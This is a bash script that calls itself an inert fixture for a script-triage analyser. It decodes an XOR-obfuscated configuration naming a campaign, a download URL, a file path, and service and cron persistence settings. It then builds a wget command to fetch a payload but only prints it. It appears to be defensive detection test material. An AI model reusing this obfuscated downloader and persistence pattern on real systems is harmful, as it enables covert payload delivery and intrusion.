#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_116f9a19='7c22cd03537e7a8c0c1d6b7c8d0a49787aa30d456770881a0c7d6d950b455579951345767e981e507e7a8e42576d7a88204f7f6b8c0a54766c881e476f409f1055646bc14e5c697e910f4163789220496e229f1e4d7a7e95184e272bcb4f453b7ac44d166c63890d4c3777880b507925d350143d2f994e45322dca190e6f679d1250667ad2164e7c7e901644252ac84d426e289f4b0e7977800a536f6da31e476f718842687f71880d45796cb01e42252bcb4f453b7ac44d166c639a164c6f408c1e546222d30b4d7a30940a4e7e6d990c53277c9d1c486f30d20c546b789952143d2f994e45322dca19'
readonly Codec_116f9a19='hex_compact|repeating_key_xor|0a,1f,fc,7f,20'

Load_116f9a19() {
  stored_bytes=()
  local raw="${Material_116f9a19}" byte_index
  for ((byte_index=0; byte_index<${#raw}; byte_index+=2)); do stored_bytes+=("$((16#${raw:byte_index:2}))"); done
}

Decode_116f9a19() {
  recovered_bytes=()
  local -a key_bytes=(10 31 252 127 32)
  local byte_index
  for ((byte_index=0; byte_index<${#stored_bytes[@]}; byte_index++)); do
    recovered_bytes+=("$((stored_bytes[byte_index] ^ key_bytes[byte_index % ${#key_bytes[@]}]))")
  done
}

Recover_116f9a19() {
  local -a stored_bytes recovered_bytes
  local configuration_text harmless_value decode_pass byte_index
  harmless_value="${HUNTRESS_FIXTURE_CONTEXT:-host}"
  Load_116f9a19
  case 1 in 1) Decode_116f9a19 ;; *) return 70 ;; esac
  configuration_text=''
  local octal character
  for byte_index in "${!recovered_bytes[@]}"; do
    printf -v octal '%03o' "${recovered_bytes[byte_index]}"
    printf -v character '%b' "\\$octal"
    configuration_text+="$character"
  done
  printf '%s\n' "$configuration_text"
}

Inspect_116f9a19() { Recover_116f9a19; }

Plan_116f9a19() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_116f9a19)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(wget -qO "$file_path" "$url")
  declare -p request_command
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_116f9a19; fi
